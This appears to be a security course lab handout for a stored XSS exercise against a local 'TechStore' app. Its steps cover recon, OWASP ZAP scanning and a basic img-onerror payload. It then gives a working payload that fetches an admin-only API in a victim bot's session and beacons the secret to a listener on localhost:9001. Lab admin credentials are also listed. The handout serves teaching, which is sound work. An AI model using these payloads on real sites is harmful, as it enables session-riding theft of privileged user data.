# Lab G Handout: Stored XSS (TechStore)


## Activity 1: Basic Recon and XSS Fundamentals

### Environment Information
When this activity starts:
- You are in a contained lab environment
- App URL: `http://localhost:30000`
- ZAP URL: `http://localhost:30004/zap/`
- Optional proxy port: `localhost:8080`
- Admin account exists (`admin` / `SecureAdminPass2025!`)
- Internet access is not required
- `FLAG1` is available in this activity

### Task: Perform quick recon of the Stored XSS lab surface

### Objective
Get a quick map of where user input is stored and rendered in TechStore before deeper testing.

### Brief Summary
This lab demonstrates Stored XSS through the product review workflow. In this activity, you identify the main input points, submit a safe test review, and confirm that content is persisted and shown back to users.

For detailed explanation of XSS attack types and concepts, refer to: [Cross Site Scripting (XSS)](https://docs.google.com/document/d/19v3_DPNZQkDsbpwXbeqAg6R8sL6nOcii6u63xovkcS4/edit?usp=sharing)

### Tasks (quick walkthrough)
1. Open `/`, `/products`, and `/reviews`.
2. Register a normal user and log in.
3. Submit a harmless text-only review and confirm it appears after reload.
4. Return to `/` and verify reconnaissance completion (`FLAG1`).

### What to look for
- Inputs that are saved and rendered later (for example: username and reviews).
- Reused output contexts that can become persistent execution surfaces.

---

## Activity 2: Automated Recon and Analysis with OWASP ZAP

### Environment Information
When this activity starts:
- App is running on `http://localhost:30000`
- ZAP Web UI is running on `http://localhost:30004/zap/`
- You already created a normal user in Activity 1
- No new flag in this activity

### Task: Use ZAP to discover and validate XSS risk

### Objective
Use an automated scanner to support manual findings and document evidence.

### Background
Manual recon finds context; automated tools improve coverage and speed.

In this activity, ZAP helps you:
- Crawl app paths
- Identify input points
- Raise alerts for potential XSS behavior

### Tasks
1. Open ZAP UI at `http://localhost:30004/zap/`.

2. Set target to `http://localhost:30000` and run a first unauthenticated crawl for public endpoints.

3. Configure authenticated scanning in ZAP:
- Create a Context for `http://localhost:30000.*`
- Set Authentication to Form-based
- Login URL: `http://localhost:30000/login`
- Logged-in indicator: `Logout (`
- Create a ZAP user with your Activity 1 student credentials
- Enable Forced User Mode for that user

4. Run Spider as User, then Active Scan as User (focus on product/review paths).

5. Review alerts and locate XSS-related findings.

### What to focus on
- Paths that accept user-controlled input.
- Alerts mentioning XSS or unsafe output encoding.
- Correlation between scan findings and the review workflow you mapped manually.
- If scan misses stored XSS, re-check auth context. Unauthenticated scans usually miss review-submission attack paths.
- No manual report export is required. Lab evaluation auto-detects your ZAP scan activity.

---

## Activity 3: Pop the First XSS (Proof of Execution)

### Environment Information
When this activity starts:
- You have a normal authenticated user account
- Review submission is available
- No new flag in this activity

### Task: Execute a basic Stored XSS payload

### Objective
Prove JavaScript execution in the vulnerable rendering context.

### Background
The lab strips `<script>` tags but does not block all executable HTML contexts.

So, event-handler payloads are still possible.

### Tasks
1. Use a basic payload such as:

```html
<img src=x onerror="alert('XSS')">
```

2. Submit it as a product review.

3. Reload the page where reviews render and confirm code execution.

4. Save your working payload to:
- `/home/labDirectory/xss-payload.txt`

### What to look for
- Payload persists in DB and re-executes on page load.
- Execution is not limited to your own session; it can affect other users viewing that page.

---

## Activity 4: Escalate XSS to Admin Access (CLI-Based)

### Environment Information
When this activity starts:
- Victim bot logs in as `admin` and browses reviews periodically (~30s)
- Sensitive admin data is exposed via `GET /api/admin/profile`
- Fake `/dashboard` and `/exfil` endpoints are not used
- `FLAG4` is generated when admin profile API is reached in admin context

### Task: Capture admin secret data using your own CLI listener

### Objective
Escalate Stored XSS from proof-of-concept to privileged data access.

### Background
Real attackers exfiltrate to infrastructure they control. In this lab, you will do the same using a local CLI listener.

### Tasks
1. Start a local listener (new terminal):

```bash
python3 -m http.server 9001 2>&1 | tee /home/labDirectory/listener.log
```

2. Craft payload to call admin API, then beacon to your listener:

```html
<img src=x onerror="fetch('/api/admin/profile').then(r=>r.json()).then(d=>{new Image().src='http://localhost:9001/?flag='+encodeURIComponent(d.secretFlag)})">
```

3. Submit payload as a review.

4. Wait one victim-bot cycle (~30s), then check listener output/log for the incoming request containing `flag=`.

5. Extract captured `FLAG4` from the listener log:

```bash
grep -o 'FLAG{[^ ]*}' /home/labDirectory/listener.log | tail -n1"
```

6. Submit final flags file with only `FLAG1` and `FLAG4`:

```bash
/home/labDirectory/flag.txt
```


### What to look for
- Admin-only endpoint was executed in admin browser context.
- Captured `secretFlag` equals `FLAG4`.
- This demonstrates full impact: Stored XSS -> privileged data theft.

---

## Required Submission Files
- `/home/labDirectory/flag.txt` (must contain only `FLAG1` and `FLAG4`, one per line)
- `/home/labDirectory/xss-payload.txt`

## Troubleshooting
- No callback yet: wait at least one victim cycle (~30s) and retry.
- Listener empty: confirm payload uses `http://localhost:9001/` and listener is running before bot visit.
- ZAP activity not detected: rerun Spider as User + Active Scan as User inside the authenticated context.
